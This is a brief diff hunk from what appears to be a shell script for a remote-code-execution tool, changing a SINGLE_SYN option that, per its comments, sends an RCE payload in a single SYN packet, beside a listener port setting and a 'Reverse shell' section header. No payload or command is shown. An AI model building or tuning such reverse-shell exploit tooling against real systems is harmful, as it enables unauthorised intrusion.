@@ -40,7 +40,7 @@ LPORT=${LPORT:-"3535"}
 # in payload only mode. This means we will
 # try to attach our RCE as a payload in a single
 # SYN packet!
-SINGLE_SYN=1
+SINGLE_SYN=0
 
 # [Reverse shell]
 #
